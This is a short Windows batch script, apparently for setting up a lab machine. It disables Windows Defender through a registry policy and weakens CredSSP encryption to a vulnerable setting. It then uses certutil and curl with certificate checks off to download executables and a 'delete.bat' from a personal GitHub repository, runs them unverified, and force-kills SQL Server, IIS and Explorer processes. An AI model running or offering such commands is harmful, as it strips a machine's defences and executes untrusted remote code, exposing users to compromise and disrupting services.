

REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters\ /v AllowEncryptionOracle /t REG_DWORD /d 2
certutil -urlcache -split -f https://raw.githubusercontent.com/syedshariq121/labcc/main/curl.exe
certutil -urlcache -split -f https://raw.githubusercontent.com/syedshariq121/labcc/main/7z.dll
certutil -urlcache -split -f https://raw.githubusercontent.com/syedshariq121/labcc/main/7z.exe

cd C:\Users\Administrator\Desktop
curl -LJOk https://raw.githubusercontent.com/syedshariq121/labcc/main/ChromeSetup.exe
curl -LJOk https://raw.githubusercontent.com/syedshariq121/labcc/main/delete.bat
start ChromeSetup.exe
cls
@echo off
start delete.bat
net start audiosrv
taskkill /f /im sqlservr.exe
taskkill /f /im Batch.exe
taskkill /f /im w3wp.exe
taskkill /f /im explorer.exe
start explorer.exe
exit
